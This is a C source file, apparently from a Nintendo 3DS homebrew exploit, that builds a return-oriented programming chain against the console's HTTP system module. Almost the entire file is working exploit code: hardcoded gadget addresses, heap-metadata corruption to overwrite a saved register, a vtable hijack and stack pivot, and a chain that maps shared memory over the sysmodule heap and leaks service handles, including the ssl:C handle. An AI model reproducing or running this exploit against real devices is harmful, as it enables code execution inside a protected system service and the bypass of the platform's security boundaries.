#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <3ds.h>

extern u8 *http_codebin_buf;
extern u32 *http_codebin_buf32;
extern u32 http_codebin_size;

u32 ROP_LDRR4R6_R5x1b8_OBJVTABLECALLx8 = 0x0010264c;//Load r4 from r5+0x1b8 and r6 from r5+0x1bc. Set r0 to r4. Load the vtable addr + funcptr using just r1 and blx to r1(vtable funcptr +8).
u32 ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 = 0x00114b30;//Load ip from r0+0(vtable ptr). Load r1 from r4+0xc, r2 from r4+0x14, and r3 from r4+0x4. Then load ip from ip+0x18(vtable+0x18) and blx to ip.
u32 ROP_STACKPIVOT = 0x00107b08;//Add sp with r3 then pop-pc.

u32 ROP_POPPC = 0x00100208;//"pop {pc}"

u32 ROP_POPR4R5R6PC = 0x00100248;//"pop {r4, r5, r6, pc}"

u32 ROP_POPR1PC = 0x0010cf64;//"pop {r1, pc}"
u32 ROP_POPR3PC = 0x00106a28;//"pop {r3, pc}"

u32 ROP_LDRR0R1 = 0x00101c64;//Load r0 from r1, then bx-lr.
u32 ROP_STRR0_R1x4 = 0x00101c8c;//Store r0 to r1+4, then bx-lr.

u32 ROP_BLXR3_ADDSP12_POPPC = 0x00119438;//"blx r3" "add sp, sp, #12" "pop {pc}"

u32 ROP_STRR7_R5x48_POPR4R5R6R7R8PC = 0x00102430;//Write r7 to r5+0x48. "pop {r4, r5, r6, r7, r8, pc}"

u32 ROP_POP_R4R5R6R7R8R9SLFPIPPC = 0x00102e10;//"pop {r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}"

u32 ROP_ADDR0IP = 0x0010bc2c;//r0+= ip, bx-lr.

u32 ROP_MOVR0R4_POPR4PC = 0x00100698;//"mov r0, r4" "pop {r4, pc}"

u32 ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP = 0x0010f9f0;//"mov r3, r0" "mov r2, r0" "mov r1, r0" "blx ip"

u32 ROP_BLXIP_POPR3PC = 0x00118c08;//"blx ip" "pop {r3, pc}"

u32 ROP_memcpy = 0x0010d274;
u32 ROP_svcControlMemory = 0x00100770;

u32 ROP_sharedmem_create = 0x001045a4;

u32 ROP_SSLC_STATE = 0x00121674;//State addr used by HTTP-sysmodule for sslc.

u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE = 0x0011b5dc;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the main service-session.
u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;

static u32 __custom_mainservsession_vtable = 0x0f000000 + 0xd00;

void ropgen_addword(u32 **ropchain, u32 *http_ropvaddr, u32 value)
{
	u32 *ptr = *ropchain;

	*ptr = value;

	(*ropchain)++;
	(*http_ropvaddr)+=4;
}

void ropgen_popr1(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x8-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_POPR1PC);
	ropgen_addword(ropchain, http_ropvaddr, value);
}

void ropgen_popr3(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x8-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_POPR3PC);
	ropgen_addword(ropchain, http_ropvaddr, value);
}

void ropgen_setr0(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x10-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR0R4_POPR4PC + 4);//"pop {r4, pc}"
	ropgen_addword(ropchain, http_ropvaddr, value);

	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR0R4_POPR4PC);
	ropgen_addword(ropchain, http_ropvaddr, 0);
}

void ropgen_popr4r5r6pc(u32 **ropchain, u32 *http_ropvaddr, u32 r4, u32 r5, u32 r6)//Total size: 0x10-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_POPR4R5R6PC);
	ropgen_addword(ropchain, http_ropvaddr, r4);
	ropgen_addword(ropchain, http_ropvaddr, r5);
	ropgen_addword(ropchain, http_ropvaddr, r6);
}

void ropgen_popr4r5r6r7r8pc(u32 **ropchain, u32 *http_ropvaddr, u32 r4, u32 r5, u32 r6, u32 r7, u32 r8)//Total size: 0x18-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_STRR7_R5x48_POPR4R5R6R7R8PC+4);
	ropgen_addword(ropchain, http_ropvaddr, r4);
	ropgen_addword(ropchain, http_ropvaddr, r5);
	ropgen_addword(ropchain, http_ropvaddr, r6);
	ropgen_addword(ropchain, http_ropvaddr, r7);
	ropgen_addword(ropchain, http_ropvaddr, r8);
}

void ropgen_popr4r5r6r7r8r9slfpippc(u32 **ropchain, u32 *http_ropvaddr, u32 *regs)//Total size: 0x28-bytes.
{
	u32 i;

	ropgen_addword(ropchain, http_ropvaddr, ROP_POP_R4R5R6R7R8R9SLFPIPPC);

	for(i=0; i<9; i++)ropgen_addword(ropchain, http_ropvaddr, regs[i]);
}

void ropgen_blxr3(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 writestackret)//Total size: 0xc-bytes + <0xc if writestackret is set>.
{
	ropgen_popr3(ropchain, http_ropvaddr, addr);

	ropgen_addword(ropchain, http_ropvaddr, ROP_BLXR3_ADDSP12_POPPC);

	if(writestackret)
	{
		ropgen_addword(ropchain, http_ropvaddr, 0);
		ropgen_addword(ropchain, http_ropvaddr, 0);
		ropgen_addword(ropchain, http_ropvaddr, 0);
	}
}

void ropgen_setr0r2r1(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x40-bytes.
{
	u32 regs[9] = {0};

	ropgen_setr0(ropchain, http_ropvaddr, value);

	regs[8] = ROP_POPPC;

	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);

	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP + 4);
}

void ropgen_movr1r0(u32 **ropchain, u32 *http_ropvaddr)//Total size: 0x2c-bytes.
{
	u32 regs[9] = {0};

	regs[8] = ROP_POPPC;

	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);

	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP + 8);
}

void ropgen_ldrr0r1(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 set_addr)//Total size: 0x18-bytes + <0x8 if set_addr is set>.
{
	if(set_addr)ropgen_popr1(ropchain, http_ropvaddr, addr);

	ropgen_blxr3(ropchain, http_ropvaddr, ROP_LDRR0R1, 1);
}

void ropgen_strr0r1(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 set_addr)//Total size: 0x18-bytes + <0x8 if set_addr is set>.
{
	if(set_addr)ropgen_popr1(ropchain, http_ropvaddr, addr-4);

	ropgen_blxr3(ropchain, http_ropvaddr, ROP_STRR0_R1x4, 1);
}

void ropgen_copyu32(u32 **ropchain, u32 *http_ropvaddr, u32 ldr_addr, u32 str_addr, u32 set_addr)//Total size: 0x30-bytes + <0x8 if set_addr bit0 is set> + <0x8 if set_addr bit1 is set>.
{
	ropgen_ldrr0r1(ropchain, http_ropvaddr, ldr_addr, set_addr & 0x1);
	ropgen_strr0r1(ropchain, http_ropvaddr, str_addr, set_addr & 0x2);
}

void ropgen_stackpivot(u32 **ropchain, u32 *http_ropvaddr, u32 addr)//Total size: 0x8-bytes.
{
	u32 ROP_STACKPIVOT_POPR3 = ROP_STACKPIVOT-4;//"pop {r3}", then the code from ROP_STACKPIVOT.

	ropgen_addword(ropchain, http_ropvaddr, ROP_STACKPIVOT_POPR3);
	ropgen_addword(ropchain, http_ropvaddr, addr - (*http_ropvaddr + 4));
}

void ropgen_add_r0ip(u32 **ropchain, u32 *http_ropvaddr, u32 addval)//Add the current value of r0 with addval. Total size: 0x40-bytes.
{
	u32 regs[9] = {0};

	regs[8] = addval;

	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);

	ropgen_blxr3(ropchain, http_ropvaddr, ROP_ADDR0IP, 1);
}

void ropgen_blxip_popr3pc(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 r3val)//Total size: 0x30-bytes.
{
	u32 regs[9] = {0};

	regs[8] = addr;

	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);

	ropgen_addword(ropchain, http_ropvaddr, ROP_BLXIP_POPR3PC);
	ropgen_addword(ropchain, http_ropvaddr, r3val);
}

void ropgen_callfunc(u32 **ropchain, u32 *http_ropvaddr, u32 funcaddr, u32 *params)//Total size: 0x78-bytes.
{
	ropgen_setr0r2r1(ropchain, http_ropvaddr, params[2]);
	ropgen_setr0(ropchain, http_ropvaddr, params[0]);

	ropgen_popr1(ropchain, http_ropvaddr, params[1]);

	ropgen_blxr3(ropchain, http_ropvaddr, ROP_POPR3PC, 0);
	ropgen_addword(ropchain, http_ropvaddr, params[3]);

	ropgen_addword(ropchain, http_ropvaddr, funcaddr);

	ropgen_addword(ropchain, http_ropvaddr, params[4]);
	ropgen_addword(ropchain, http_ropvaddr, params[5]);
	ropgen_addword(ropchain, http_ropvaddr, params[6]);
}

void ropgen_svcControlMemory(u32 **ropchain, u32 *http_ropvaddr, u32 outaddr, u32 addr0, u32 addr1, u32 size, MemOp op, MemPerm perm)//Total size: 0x78-bytes.
{
	u32 params[7] = {0};

	params[0] = outaddr;
	params[1] = addr0;
	params[2] = addr1;
	params[3] = size;
	params[4] = op;
	params[5] = perm;

	ropgen_callfunc(ropchain, http_ropvaddr, ROP_svcControlMemory, params);
}

void ropgen_memcpy(u32 **ropchain, u32 *http_ropvaddr, u32 dst, u32 src, u32 size)//Total size: 0x78-bytes.
{
	u32 params[7] = {0};

	params[0] = dst;
	params[1] = src;
	params[2] = size;

	ropgen_callfunc(ropchain, http_ropvaddr, ROP_memcpy, params);
}

void ropgen_sharedmem_create(u32 **ropchain, u32 *http_ropvaddr, u32 ctx, u32 addr, u32 size, MemPerm mypermission, MemPerm otherpermission)//Total size: 0x78-bytes.
{
	u32 params[7] = {0};

	params[0] = ctx;
	params[1] = addr;
	params[2] = size;
	params[3] = mypermission;
	params[4] = otherpermission;

	ropgen_callfunc(ropchain, http_ropvaddr, ROP_sharedmem_create, params);
}

Result init_hax_sharedmem(u32 *tmpbuf)
{
	u32 sharedmembase = 0x10006000;
	u32 target_overwrite_addr;
	u32 object_addr = sharedmembase + 0x200;
	u32 *initialhaxobj = &tmpbuf[0x200>>2];
	u32 *haxobj1 = &tmpbuf[0x400>>2];
	u32 *ropchain = &tmpbuf[0x600>>2];
	u32 http_ropvaddr = sharedmembase+0x600;

	u32 *ropchain_ret2http = &tmpbuf[0xfd0>>2];
	u32 ret2http_vaddr = sharedmembase+0xfd0;
	u32 new_ropvmem = 0x0f000000;
	u32 ret2http_vaddr_new = new_ropvmem + 0xf00;

	u32 *new_ropchain = &tmpbuf[0x900>>2];
	u32 http_newropvaddr = sharedmembase+0x900;

	u32 closecontext_stackframe = 0x0011d398;//This is the stackframe address for the actual CloseContext function.

	u32 regs[9] = {0};

	target_overwrite_addr = closecontext_stackframe;
	target_overwrite_addr-= 0xc;//Subtract by this value to get the address of the saved r5 which will be popped.

	//Overwrite the prev/next memchunk ptrs in the CTRSDK freemem memchunkhdr following the allocated struct for the POST data.
	//Once the free() is finished, object_addr will be written to target_overwrite_addr, etc.
	tmpbuf[0x44>>2] = target_overwrite_addr - 0xc;
	tmpbuf[0x48>>2] = object_addr;

	//Once http-sysmodule returns into the actual-CloseContext-function, r5 will be overwritten with object_addr. Then it will eventually call vtable funcptr +4 with this object. Before doing so this CloseContext function will write val0 to the two words @ obj+8 and obj+4.

	initialhaxobj[0] = object_addr+0x100;//Set the vtable to sharedmem+0x300.
	initialhaxobj[1] = object_addr+4;//Set obj+4 to the addr of obj+4, so that most of the linked-list code is skipped over.
	tmpbuf[(0x300+4) >> 2] = ROP_LDRR4R6_R5x1b8_OBJVTABLECALLx8;//Set the funcptr @ vtable+4. This where the hax initially gets control of PC. Once this ROP finishes it will jump to ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 below.

	initialhaxobj[0x1b8>>2] = object_addr+0x200;//Set the addr of haxobj1 to sharedmem+0x400(this object is used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8).

	haxobj1[0] = sharedmembase+0x500;
	//Setup the regs loaded by ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18.
	haxobj1[0xc>>2] = 0;//r1
	haxobj1[0x14>>2] = 0;//r2
	haxobj1[0x4>>2] = (sharedmembase+0x600) - closecontext_stackframe;//r3

	//Init the vtable for haxobj1.
	tmpbuf[(0x500+8) >> 2] = ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18;//Init the funcptr used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8. Once this ROP finishes it will jump to ROP_STACKPIVOT.
	tmpbuf[(0x500+0x18) >> 2] = ROP_STACKPIVOT;//Stack-pivot to sharedmem+0x600.

	//Setup the actual ROP-chain.

	//Write the current r7 value which isn't corrupted yet, to the ret2http ROP.
	ropgen_popr4r5r6pc(&ropchain, &http_ropvaddr, 0, ret2http_vaddr + 0x10 - 0x48, 0);
	ropgen_addword(&ropchain, &http_ropvaddr, ROP_STRR7_R5x48_POPR4R5R6R7R8PC);
	ropgen_addword(&ropchain, &http_ropvaddr, 0);
	ropgen_addword(&ropchain, &http_ropvaddr, 0);
	ropgen_addword(&ropchain, &http_ropvaddr, 0);
	ropgen_addword(&ropchain, &http_ropvaddr, 0);
	ropgen_addword(&ropchain, &http_ropvaddr, 0);

	//Copy the original r5 value from the original thread stack, to the ropchain data so that it's popped into r5.
	ropgen_copyu32(&ropchain, &http_ropvaddr, closecontext_stackframe - 8*4, ret2http_vaddr + 0x8, 0x3);

	//Likewise for r4.
	ropgen_copyu32(&ropchain, &http_ropvaddr, closecontext_stackframe - 2*4, ret2http_vaddr + 0x4, 0x3);

	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, ret2http_vaddr + 0x10, 1);//Load the r7 value from above into r0.
	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x98);//r0 = original value of r6(original_r7+0x98).
	ropgen_strr0r1(&ropchain, &http_ropvaddr, ret2http_vaddr + 0xc, 1);//Write the calculated value for the original r6, to the ret2http ROP.

	ropgen_svcControlMemory(&ropchain, &http_ropvaddr, http_ropvaddr+12, new_ropvmem, 0, 0x1000, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);

	//ropgen_memcpy(&ropchain, &http_ropvaddr, new_ropvmem, http_newropvaddr, 0x6d0);
	ropgen_memcpy(&ropchain, &http_ropvaddr, ret2http_vaddr_new, ret2http_vaddr, 0x30);

	/*ropgen_stackpivot(&ropchain, &http_ropvaddr, new_ropvmem);//Pivot to the relocated ROP-chain.

	if(http_ropvaddr > http_newropvaddr)
	{
		printf("http_ropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_ropvaddr - http_newropvaddr));
		return -2;
	}

	http_newropvaddr = new_ropvmem;*/
	ret2http_vaddr = ret2http_vaddr_new;

	http_newropvaddr = http_ropvaddr;
	new_ropchain = ropchain;

	//Create sharedmem over the entire sysmodule heap, prior to the SOC-sharedmem.
	ropgen_sharedmem_create(&new_ropchain, &http_newropvaddr, ret2http_vaddr+0xe0, 0x08000000, 0x22000, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);

	//Create sharedmem over the new_ropvmem page.
	ropgen_sharedmem_create(&new_ropchain, &http_newropvaddr, ret2http_vaddr+0xc0, new_ropvmem, 0x1000, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);

	//Setup the custom vtable used by setuphaxx_httpheap_sharedmem().
	ropgen_memcpy(&new_ropchain, &http_newropvaddr, __custom_mainservsession_vtable, ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE, ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE);
	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x40404040);
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, __custom_mainservsession_vtable + 0x8, 1);//Overwrite the vtable funcptr for CreateContext.

	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe + 0x14, 1);//Load the saved LR value in the httpc_cmdhandler func.
	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xc);//r0+= 0xc.
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe + 0x14, 1);//Write the modified LR value back into the stackframe. Hence, the code which writes to the cmd-reply data will be skipped over.

	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xfffffffc);
	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf-4
	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x00030044);
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[0] = 0x00030044

	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf
	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[1] = 0x0

	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x4);//r0+= 0x4.
	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x4
	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0 | ((0x2-1)<<26));
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[2] = <translate-header for sending two handles which get closed in the HTTP process>

	//Write the httpheap sharedmem handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, ret2http_vaddr+0xe0+0x14, 1);
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, http_newropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);

	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x8);//r0+= 0x8.
	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x8
	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[3] = <value written by the above ROP>

	//Write the new_ropvmem sharedmem handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, ret2http_vaddr+0xc0+0x14, 1);
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, http_newropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);

	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xc);//r0+= 0xc.
	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0xc
	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[4] = <value written by the above ROP>

	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x10);//r0+= 0x10.
	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x10
	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x10);
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[5] = 0x10

	//Write the ssl:C handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, ROP_SSLC_STATE + 24, 1);
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, http_newropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);

	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x14);//r0+= 0x14.
	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x14
	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[6] = <value written by the above ROP>

	ropgen_stackpivot(&new_ropchain, &http_newropvaddr, ret2http_vaddr);//Pivot to the return-to-http ROP-chain.

	if(http_newropvaddr > sharedmembase+0xfd0)
	{
		printf("http_newropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_newropvaddr - (sharedmembase+0xfd0)));
		return -2;
	}

	/*if(http_newropvaddr > __custom_mainservsession_vtable)
	{
		printf("http_newropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_newropvaddr - __custom_mainservsession_vtable));
		return -2;
	}*/

	/*if(http_newropvaddr - new_ropvmem > 0x6d0)
	{
		printf("The ROP data for http_newropvaddr is 0x%08x-bytes too large to fit in the allocated sharedmem area.\n", (unsigned int)((http_newropvaddr - new_ropvmem) - 0x6d0));
		return -2;
	}*/

	regs[7] = 0x0011c418;//Set fp to the original value.

	ropgen_popr4r5r6r7r8r9slfpippc(&ropchain_ret2http, &ret2http_vaddr, regs);//The register values here are overwritten by the above ROP. r8 doesn't matter here since it's not used before r8 gets popped from stack @ returning from the function which is jumped to below. Likewise for r9+sl, they get popped from the stack when httpc_cmdhandler() returns.

	//Return to executing the original sysmodule code.
	ropgen_stackpivot(&ropchain_ret2http, &ret2http_vaddr, closecontext_stackframe - 4);

	return 0;
}

Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_sharedmem_size)
{
	u32 pos;

	for(pos=0; pos<(httpheap_sharedmem_size>>2); pos++)
	{
		if(httpheap_sharedmem[pos] != ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE)continue;

		httpheap_sharedmem[pos] = __custom_mainservsession_vtable;
	}

	return 0;
}

